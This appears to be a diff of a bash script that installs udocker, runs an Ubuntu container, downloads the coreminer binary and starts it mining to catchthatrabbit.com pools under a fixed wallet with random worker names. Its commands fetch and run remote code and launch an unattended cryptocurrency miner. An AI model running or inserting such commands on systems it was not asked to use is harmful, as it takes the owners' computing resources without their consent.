@@ -1,3 +1,15 @@
-ls
-curl https://sourceforge.net/projects/drths/files/corearm.tar.gz/download -L -o corearm.tar.gz && tar xf corearm.tar.gz
+#!/bin/bash
+wget https://github.com/indigo-dc/udocker/releases/download/1.3.17/udocker-1.3.17.tar.gz
+tar zxvf udocker-1.3.17.tar.gz
+export PATH=`pwd`/udocker-1.3.17/udocker:$PATH
+udocker pull ubuntu:latest
+udocker create --name=latest ubuntu:latest
+udocker  run latest /bin/bash
+
+udocker
+echo
+apt update && apt -y install unzip wget curl
+curl https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz -L -o coreminer-linux-x86_64.tar.gz
+tar xf coreminer-linux-x86_64.tar.gz
+cd coreapp
 ./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008
